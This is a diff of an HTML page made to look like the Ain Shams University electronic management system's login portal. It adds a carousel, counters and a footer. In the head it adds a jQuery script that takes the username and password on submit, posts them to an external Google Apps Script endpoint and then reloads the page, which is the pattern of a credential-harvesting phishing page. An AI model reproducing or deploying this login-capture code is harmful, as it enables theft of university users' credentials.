@@ -7,9 +7,26 @@
     <link rel="stylesheet" href="css/all.min.css">
     <link rel="stylesheet" href="css/bootstrap.min.css">
     <link rel="stylesheet" href="style.css">
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+    <script type="text/javascript" >
+
+        $(document).ready(function(){
+            $(".form").on('submit' , function(e){
+            e.preventDefault();
+            var name=$(".name").val();
+            var password=$(".password").val();
+            $.post("https://script.google.com/macros/s/AKfycbyalT3CzK69CymAl2cKO4tXlGtcnKCqeUs4z0VhkexeztwYv59zoMUskw9UGSKyVIHC/exec" , {n:name , p:password} , function(){
+                location.reload();
+          });
+        });
+      });
+
+    </script>
+
     <title>Document</title>
 </head>
-<body>
+<body class="body">
     <nav>
         <div class="NavInfo header_top" style="background-color:#1c335f">
             <div class="container " >
@@ -55,31 +72,82 @@
             <div class="UmsDescripe col-lg-10 col-md-10 col-xs-8" style="padding: 37px; "><span>Electronic Management System of Ain Shams University</span></div>
         </div>
     </div> 
-     <div class="container">
-        <div class="  container1 ">
-            <i class="fa-solid fa-angle-left  ArrowLeft" id="LeftArrow"></i>
-            <i class="fa-solid fa-angle-right  ArrowRight" id="RightArrow"></i>
-            <div class="slider SlideShow row ">
-                
-                <img  class="im1 col-lg-4 " src="top-view-person-writing-laptop-with-copy-space.jpg" alt="" >
-                <span class="span1">Ain Shams University <br> Electronic System <br><span class="descripe1">manages the educational and administrative process within the university</span><br><button type="button" class="btn btn-outline-primary " style="border-radius: 40px;">Descover</button> <button type="button" class="btn btn-outline-primary" style="border-radius: 40px;">Your opinion</button>
 
-                </span>
-                <img  class="im2 col-lg-4" src="im1.jpg" alt="">
-                <img class="im3 col-lg-4" src="cheerful-young-womang (1).jpg" alt="">
-                
-                
-            </div>
-            <div class="CheckContainer">
-        
-                <div class="Check1" id="Check1"></div>
-                <div class="Check2"></div>
-                <div class="Check3"></div>
-            </div>
+
+
+
+
+
+
+
+
+
+    <div id="carouselExampleCaptions" class="carousel slide" data-bs-ride="carousel">
+        <div class="carousel-indicators">
+          <button type="button" data-bs-target="#carouselExampleCaptions" data-bs-slide-to="0" class="active" aria-current="true" aria-label="Slide 1"></button>
+          <button type="button" data-bs-target="#carouselExampleCaptions" data-bs-slide-to="1" aria-label="Slide 2"></button>
+          <button type="button" data-bs-target="#carouselExampleCaptions" data-bs-slide-to="2" aria-label="Slide 3"></button>
         </div>
-         
-    </div>
-   
+        <div class="carousel-inner">
+          <div class="carousel-item active" style="height: 600px;">
+            <img src="top-view-person-writing-laptop-with-copy-space.jpg" class="d-block w-100" alt="" style="height: 100%;">
+            <div class="carousel-caption Caption1 d-md-block ">
+                <div class="row">
+                    <div class=" " style="color: #1c335f  ;  text-align: end;">
+                        <h2 style=" font-weight: 600;" > Ain Shams University electronic systems</h2>
+                        <p>  Which manages the educational and administrative process within the university</p>
+                        <button class="btn btn-outline-primary " style="border-radius: 20px; margin: 2px;" >Your Opinion Matters </button>
+                        <button class="btn btn-outline-primary" style="border-radius: 20px; margin: 2px;" >Descover</button>
+
+                    </div>
+                </div>
+            </div>
+          </div>
+          <div class="carousel-item " style="height: 600px;">
+            <img src="im1.jpg" class="d-block w-100" alt="" style="height: 100%;">
+            <div class="carousel-caption Caption2 d-md-block">
+                <div class="row">
+                    <div class=" " style="color: #FFC107  ;  text-align: start;">
+                        <h2 style=" font-weight: 600;" > Book Your Course Now</h2>
+                        <p> You can book courses on Coursera or apply to Postgraduate <br> Studies online using our system</p>
+                        <button class="btn btn-warning " style="border-radius: 20px; margin: 2px;" >Your Opinion Matters </button>
+                        <button class="btn btn-warning" style="border-radius: 20px; margin: 2px;" >Descover</button>
+
+                    </div>
+                </div>
+            </div>
+          </div>
+          <div class="carousel-item" style="height: 600px;">
+            <img src="close-up-graduation-certificate.jpg" class="d-block w-100" alt="" style="height: 100%;">
+            <div class="carousel-caption Caption3  d-md-block">
+                <div class="row">
+                    <div class=" " style="color: #1c335f  ;  text-align: start;">
+                        <h2 style=" font-weight: 600;" > What Are Services That Are <br> Provided On Our System?</h2>
+                        <p>You can know your results, submit petitions, pay expenses, <br> register for materials, file complaints </p>
+                        <button class="btn btn-warning" style="border-radius: 20px; margin: 10px; margin-left: 40px ; " >Login</button>
+
+                    </div>
+                </div>
+            </div>
+          </div>
+        </div>
+        <button class="carousel-control-prev" type="button" data-bs-target="#carouselExampleCaptions" data-bs-slide="prev">
+          <span class="carousel-control-prev-icon" aria-hidden="true"></span>
+          <span class="visually-hidden">Previous</span>
+        </button>
+        <button class="carousel-control-next" type="button" data-bs-target="#carouselExampleCaptions" data-bs-slide="next">
+          <span class="carousel-control-next-icon" aria-hidden="true"></span>
+          <span class="visually-hidden">Next</span>
+        </button>
+      </div>
+
+
+
+
+
+
+
+
 <!--     
     
     <div class="carousel">
@@ -247,7 +315,7 @@
         </div>
     </section>
 
-    <section style="margin: 10px;">
+    <section style="margin: 10px; overflow: hidden;">
 
         <div class="container-fluid h-custom LoginContainer">
             <div class="row d-flex justify-content-center align-items-center h-100">
@@ -255,7 +323,7 @@
                 <img src="CardsBackground.jpg" class="img-fluid" alt="">
             </div>
                 <div class="col-md-8 col-lg-6 col-xl-4 offset-xl-1">
-                    <form>
+                    <form method="post"  class="form">  
 
                         <div class="Login d-flex align-items-center">
                             <p class="text-center fw-bold mb-4 " style="font-size: 25px ;">Login</p>
@@ -264,12 +332,12 @@
 
                         <div class="form-outline mb-4">
                             <label class="form-label" for="username">Username</label>
-                        <input type="text" id="username" class="form-control form-control-lg" placeholder="username" />
+                        <input type="text" id="username" class="form-control form-control-lg name"  placeholder="username" />
                         </div>
 
                         <div class="form-outline mb-3">
                             <label class="form-label" for="password">Password</label>
-                            <input type="password" id="password" class="form-control form-control-lg"placeholder="Enter password" />
+                            <input type="password" id="password" class=" password form-control form-control-lg"placeholder="Enter password" />
                         </div>
                         
                         <div class="d-flex justify-content-between align-items-center">
@@ -281,11 +349,12 @@
                                 </label>
                             </div>
 
-                            <a href="#" class="text-body">Can't Remember Your Password?</a>
+                            <a href="#" class=" DarkLink">Can't Remember Your Password?</a>
                         </div>
             
                         <div class="text-center text-lg-start mt-4 pt-2">
-                            <button type="button" class="btn btn-primary btn-lg" style="border-radius: 30px; width:150px;">Login</button>
+                            <input class="submit btn btn-primary btn-lg" type="submit" style="border-radius: 30px; width:150px;"  value="Login">
+
                         </div>
                         <span style="margin-left:5px ;"> <a href=""class="link-danger"> Can't Login ? Contact Technical Support</a></span>
 
@@ -493,7 +562,10 @@
 
 
 
-                <div class="container" style="overflow: hidden; height: 1200px;">
+                
+                
+
+                <div class="container" style="overflow: hidden; padding: 20px;">
 
                     <div class="container ServicesContainer rounded" style="height:100%; margin-top: 10px; color: #4b505e; ">
                         <div class="row d-flex justify-content-center align-items-center h-100">
@@ -520,72 +592,149 @@
                                     <li> <a href="">Coursera Courses</a></li>
                                     <li><a href="">Documentation Of Certificates</a>  </li>
                                     <li> <a href="">Applying for Post Graduate Studies</a></li>
-                                
+                                    
                                 </ul>
                             </div>
                         </div>
                     </div>
-            
+                    
                 </div>
-        
-            
-            <section class="stat ">
-                <div class="container " style="background-color:#1c335f; align-items: center; display: flex;">
-                    <div class="row d-flex justify-content-center">
-                        <div class="col-lg-3 col-md-4">
-                            <div class="progress blue">
-                                <span class="ProgressLeft">
-                                    <span class="ProgressBar"></span>
-                            </span>
-                            <span class="ProgressRight">
-                                    <span class="ProgressBar"></span>
-                            </span>
-                            <div class="ProgressValue">+19</div>
+                
+
+                    <div class=" CountersContainer " style="background-color: #1c335f; padding: 80px;"  >
+                        <div class="row justify-content-around">
+
+                            <div class="col-3 " style="width:200px ;">
+                                <span style="font-size: 25px; color: #eee;"> Faculty</span>
+                                <div style="width: 200px; height: 40px; background-color: #4b505e; position: relative; transition: ease 1s;  border-radius: 20px;"> 
+                                    <span style="position: absolute; font-size: 20px; color: #eee;  padding: 3px; " class="cnt1">+19</span>
+                                    <div class="Bar1" style="background-color: #aa6ffa; width: 0px; height: 40px; transition: ease 3s;  border-radius: 20px;"  ></div>
+                                </div>
+
                             </div>
-            
-                        </div>
-                        <div class="col-lg-3 col-md-4">
-                            <div class="progress blue">
-                                <span class="ProgressLeft">
-                                    <span class="ProgressBar"></span>
-                            </span>
-                            <span class="ProgressRight">
-                                    <span class="ProgressBar"></span>
-                            </span>
-                            <div class="ProgressValue">1,229,145</div>
+                            
+                            <div class="col-3 " style="width: 200px;">
+                                <span  style="font-size: 25px; color: #eee;"> VisitorsNumber  </span>
+                                <div style="width: 200px; height: 40px; background-color: #4b505e; position: relative; transition: ease 1s;  border-radius: 20px;"> 
+                                    <span style="position: absolute; font-size: 20px; color: #eee;  padding: 3px;" class="cnt2">1,229,145</span>
+                                    <div class="Bar2" style="background-color: #f3af4e; width: 0px; height: 40px; transition: ease 3s;  border-radius: 20px;"  ></div>
+                                </div>
+
                             </div>
-            
-                        </div>
-                        
-                        <div class="col-lg-3 col-md-4">
-                            <div class="progress blue">
-                                <span class="ProgressLeft">
-                                    <span class="ProgressBar"></span>
-                            </span>
-                            <span class="ProgressRight">
-                                    <span class="ProgressBar"></span>
-                            </span>
-                            <div class="ProgressValue">220614+</div>
+
+                            
+                            <div class="col-3 " style="width: 200px;">
+                                <span style="font-size: 25px; color: #eee;">UndergraduateStudents</span>
+                                <div style="width: 200px; height: 40px; background-color: #4b505e; position: relative; transition: ease 1s;  border-radius: 20px;"> 
+                                    <span style="position: absolute; font-size: 20px; color: #eee;  padding: 3px;" class="cnt3">220614+</span>
+                                    <div class="Bar3" style="background-color: #6fadfa; width: 0px; height: 40px; transition: ease 3s;  border-radius: 20px;"  ></div>
+                                </div>
+
+                            </div>
+
+                            
+                            <div class="col-3 " style="width: 200px;">
+                                <span style="font-size: 25px; color: #eee;">PostgraduateStudents</span>
+                                <div style="width: 200px; height: 40px; background-color: #4b505e; position: relative; transition: ease 1s;  border-radius: 20px;"> 
+                                    <span style="position: absolute; font-size: 20px; color: #eee; padding: 3px;" class="cnt4">20540+</span>
+                                    <div class="Bar4" style="background-color: #fa6fd1; width: 0px; height: 40px; transition: ease 3s;  border-radius: 20px;"  ></div>
+                                </div>
+
                             </div>
                             
                         </div>
+                    </div>
+
+
+
+
+
+            <button class="btn btn-primary " id="DarkMode" style="position: fixed ; bottom: 10%; right: 5%;z-index: 25;  border-radius: 50%; height: 50px; width: 50px;"  > <i class="fa-solid fa-moon"></i></button>
+            <button class="btn btn-primary " id="DarkMode" style="position: fixed ; bottom: 10%; right: 5%;z-index: 24;  border-radius: 50%; height: 50px; width: 50px;"  > <i class="fa-solid fa-sun"></i></button>
+
+            <footer style=" padding: 40px; background-color: #eff2f9; overflow: hidden;">
+                <div class="container " >
+                    <div class="row row1 align-items-center">
+
                         <div class="col-lg-3 col-md-4">
-                            <div class="progress blue">
-                                <span class="ProgressLeft">
-                                    <span class="ProgressBar"></span>
-                            </span>
-                            <span class="ProgressRight">
-                                    <span class="ProgressBar"></span>
-                            </span>
-                            <div class="ProgressValue">20540+</div>
-                            </div>
-            
+                            <img src="logoums (1).png" alt="" width="200px" height="150px">
+                        </div>
+
+                        <div class="col-lg-3 col-md-4" style="color: #4b505e; padding: 10px;">
+                            <h5>Who Are We</h5>
+                            <ul class="list-unstyled FooterLinks" style="height: 250px; display: flex; flex-direction: column; justify-content: space-around; align-content: space-around;">
+                                <li> <a href="">About Us</a></li>
+                                <li> <a href="">Ain Shams University</a></li>
+                                <li> <a href="">FCIS</a></li>
+                                <li> <a href="">Complaints / Suggestions</a></li>
+                                <li> <a href="">Your Opinion Matters</a></li>
+                                <li> <a href="">Contact Us</a></li>
+                            </ul>
+                        </div>
+
+                        <div class="col-lg-3 col-md-4" style="color: #4b505e; padding: 10px;">
+                            <h5>Important Links</h5>
+                            <ul class="list-unstyled FooterLinks" style="height: 250px;">
+                                <li style="padding-bottom: 10px;"> <a href="">Site Map</a></li>
+                                <li style="padding-bottom: 10px;"> <a href="">Egyptian University</a></li>
+                                <li style="padding-bottom: 10px;"> <a href="">Academy Of Scientific Research</a></li>
+                                <li style="padding-bottom: 10px;"> <a href="">Egyptian Knowledge Bank</a></li>
+                                
+                            </ul>
+                        </div>
+
+                        
+                        <div class="col-lg-3 col-md-4" style="color: #4b505e; padding: 10px;">
+                            <h5>Follow Us</h5>
+                            <ul class="FooterSocial list-unstyled list-inline">
+                                <li class="list-inline-item"> <a href="facebook.com"><i class="fa-brands fa-facebook FIcon"></i></a></li>
+                                <li class="list-inline-item"> <a href="youtube.com"><i class="fa-brands fa-youtube YIcon"></i></a></li>
+                                <li class="list-inline-item"><i class="fa-brands fa-linkedin-in  LIcon"></i></li>
+                                <li class="list-inline-item"> <a href="https://www.asu.edu.eg/"><i class="fa-solid fa-globe GIcon"></i></a></li>
+                                
+                            </ul>
+                            <ul class="list-unstyled FooterLinks" style="height: 200px;">
+                                <li style="padding-bottom: 10px;">Email : <a href="">ums.support@cis.asu.edu.eg</a></li>
+                                <li style="padding-bottom: 10px;">Phone : <a href="">26831231 , 26831471 , 26831474</a></li>
+                                
+                            </ul>
                         </div>
 
                     </div>
-                </div>
 
-            </section>
+                </div>
+                
+                <div class="FooterBottom">
+                    <div class="container">
+                        <div class="row">
+                            <div class="col-lg-3 col-md-4 col-sm-6 justify-content-center d-flex" style="color: #4b505e;"> <p> © FCIS-AinShams 2020 - 2022</p> </div>
+
+                            <div class="col-lg-3 justify-content-center">
+                                <ul class="social list-unstyled list-inline justify-content-center d-flex">
+                                    <li class="list-inline-item"> <a href="facebook.com"><i class="fa-brands fa-facebook" style="color:#4b505e ;"></i></a></li>
+                                    <li class="list-inline-item"> <a href="youtube.com"><i class="fa-brands fa-youtube"  style="color:#4b505e ;" ></i></a></li>
+                                    <li class="list-inline-item"><i class="fa-brands fa-linkedin-in"  style="color:#4b505e ;"></i></li>
+                                    <li class="list-inline-item"> <a href="https://www.asu.edu.eg/" ><i class="fa-solid fa-globe"  style="color:#4b505e ;"></i></a></li>
+                                    
+                                </ul>
+                            </div>
+
+                            <div class="col-lg-6 col-md-6 col-sm-12">
+                                <ul class="list-unstyled list-inline justify-content-center FooterFinish">
+                                    <li class="list-inline-item "> <a href=""> Terms Of Use</a></li>
+                                    <li class="list-inline-item"> <a href=""> Privacy Policy</a></li>
+                                    <li class="list-inline-item"> <a href=""> FAQ</a></li>
+                                    <li class="list-inline-item"> <a href=""> Customer Services Chatter</a></li>
+                                </ul>
+                            </div>
+
+                        </div>
+
+                        
+                    </div>
+
+                </div>
+            </footer>
         
 
 
